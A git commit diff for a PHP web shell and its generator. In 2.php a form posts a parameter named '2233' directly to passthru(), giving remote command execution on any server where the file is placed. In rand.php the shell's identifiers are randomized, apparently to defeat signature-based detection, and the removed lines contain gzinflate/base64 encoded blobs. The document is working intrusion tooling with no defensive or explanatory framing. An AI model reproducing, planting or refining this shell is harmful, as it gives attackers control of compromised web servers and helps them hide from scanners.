e906bde0cf9936b0589172e62260c9fb2cbeeac0
raincoats <tomshaddock@outlook.com>
2015-06-11 13:57:00 +1000

    made the random name gen into its own function

--- 2.php
+++ 2.php
@@ -1,18 +1,18 @@
 
 <?php
 
-$nbgc5iZ5AWTQba = <<< EOF
+$KvMzVLXmIaosH = <<< EOF
 <html>
 	<head>
 		<style>
 			input{ background-color: rgb(255, 255, 255); width: 50%;}
 			* { font-size: 12px; color: rgb(0, 0, 0); font-family: monospace !important;}
 			body{ background-color: rgb(250, 250, 250);}
-			xXCocQi7HCePh{ color: rgb(170, 170, 170);}
+			AbvvTIjnV7Fgt{ color: rgb(170, 170, 170);}
 		</style>
 	</head>
 	<body>
-		<form action="bDv98RgirbPK0s" id="form" method="POST">
+		<form action="v5jQhQVPmSNoP0" id="form" method="POST">
 			<span>$ </span>
 			<input type="text" name="2233" autocomplete="off" autofocus>
 			<span> 2&gt;&amp;1 </span>
@@ -22,12 +22,12 @@ $nbgc5iZ5AWTQba = <<< EOF
 <pre>
 EOF;
 
-function ZJigkH6cHbw42($jhHxW8mpnm4EH){
-	echo "<xXCocQi7HCePh>$ ".$jhHxW8mpnm4EH."</xXCocQi7HCePh><br>";
-	echo passthru($jhHxW8mpnm4EH." 2>&1");
+function oFmxzlZCvx2LDG($NJvbIIQrdC0){
+	echo "<AbvvTIjnV7Fgt>$ ".$NJvbIIQrdC0."</AbvvTIjnV7Fgt><br>";
+	echo passthru($NJvbIIQrdC0." 2>&1");
 }
-$d1OFjXWj8Gzqye=$_REQUEST["2233"];
-echo preg_replace('/bDv98RgirbPK0s/', basename($_SERVER["SCRIPT_NAME"]), $nbgc5iZ5AWTQba);
+$GqCmp7Jz98I6Rt=$_REQUEST["2233"];
+echo preg_replace('/v5jQhQVPmSNoP0/', basename($_SERVER["SCRIPT_NAME"]), $KvMzVLXmIaosH);
 
-isset($d1OFjXWj8Gzqye)? ZJigkH6cHbw42($d1OFjXWj8Gzqye) : $WeMiOHVgQ3Jn9=$qhezVN09hhd04
+isset($GqCmp7Jz98I6Rt)? oFmxzlZCvx2LDG($GqCmp7Jz98I6Rt) : $aOY70bs40zQMAr=$anUa7XJFUc8Nm
 ;?>
--- rand.php
+++ rand.php
@@ -1,52 +1,23 @@
 <?php
-/*
-<?php 
-function $functions[1]($functions[2]){
-	echo "<asdf>$ ".$functions[2]."</asdf><br>";
-	echo passthru($functions[2]." 2>&1");
+
+
+function make_random_name(){
+	$name = rand() * rand();
+	$name = hash("whirlpool", $name);
+	$name = crypt($name);
+	// shorten
+	$name = preg_replace('~([\.\$/]|.{16}$)~', '', $name);
+	// rm leading numbers
+	$name = preg_replace('/^[0-9]+/', '', $name);
+	// make sure the regex didn't leave us an empty string
+	return ($name = NULL? make_random_name(): $name);
 }
-$functions[4]=$_REQUEST["2233"];
-$functions[5]=basename($_SERVER['SCRIPT_NAME']);
-echo gzinflate(base64_decode('bY7NDoIwEIRfBTVeTAjVxEtb+y5Lf6SRdpt2iSLh3RXhaOb2zUxmZEehV7KzYJQsNPZW+ZgGmlrQj3vGIZpaY4+ZH5xz4ukNdfzKjmI+TQ4j1cW/LT9f0ktsMcaY+DkOgu9HHjBiSaBttfMhYSaIJOYWzfhvAxaJGYpx08YAvkA26znZrFeXvpIOc6hAk8d4238A')).$functions[5].gzinflate(base64_decode('NY5RCsIwEESvsiyhv8X0s9u9goJeIG0TDZhsaDegt7fa+jfzBh6DEOcBgywJIXl9yNYu5+sNmdbiMhug9hco5lIV9F38gOpfipBd2rK1XYfgqsokqTy9bkxC2FGQqa6HCmxz175xqfSnv3SsqpIP61rHFBXZGEPtvjC1329Mk8yeqSyePw=='));
-isset($functions[4])?$functions[1]($functions[4]):$fieowfhh4ioejhceuifph3u='';?>
-*/
 
+$functions = array();
 
-$functions = array(
-	preg_replace('/^[0-9]+/', '',  preg_replace('~([\.\$/]|.{16}$)~', '', crypt(rand() * rand()))),
-	preg_replace('/^[0-9]+/', '',  preg_replace('~([\.\$/]|.{16}$)~', '', crypt(rand() * rand()))),
-	preg_replace('/^[0-9]+/', '',  preg_replace('~([\.\$/]|.{16}$)~', '', crypt(rand() * rand()))),
-	preg_replace('/^[0-9]+/', '',  preg_replace('~([\.\$/]|.{16}$)~', '', crypt(rand() * rand()))),
-	preg_replace('/^[0-9]+/', '',  preg_replace('~([\.\$/]|.{16}$)~', '', crypt(rand() * rand()))),
-	preg_replace('/^[0-9]+/', '',  preg_replace('~([\.\$/]|.{16}$)~', '', crypt(rand() * rand()))),
-	preg_replace('/^[0-9]+/', '',  preg_replace('~([\.\$/]|.{16}$)~', '', crypt(rand() * rand()))),
-	preg_replace('/^[0-9]+/', '',  preg_replace('~([\.\$/]|.{16}$)~', '', crypt(rand() * rand()))),
-	preg_replace('/^[0-9]+/', '',  preg_replace('~([\.\$/]|.{16}$)~', '', crypt(rand() * rand()))),
-);
-/*
-$html = <<< EOF
-<html>
-	<head>
-		<style>
-			input{ background-color: rgb(255, 255, 255); width: 50%;}
-			* { font-size: 12px; color: rgb(0, 0, 0); font-family: monospace !important;}
-			body{ background-color: rgb(250, 250, 250);}
-			$functions[3]{ color: rgb(170, 170, 170);}
-		</style>
-	</head>
-	<body>
-		<form action="$functions[5]" id="form" method="POST">
-			<span>$ </span>
-			<input type="text" name="2233" autocomplete="off" autofocus>
-			<span> 2&gt;&amp;1 </span>
-			<button type="submit">$$$</button>
-		</form>
-	<code>
-<pre>
-EOF;
-*/
-// echo "<html 1>".$'.$functions[5].'<html 2>;
-
+for ($i=0; $i<=10; $i++){
+	$functions[$i] = make_random_name();
+}
 
 echo '
 <?php
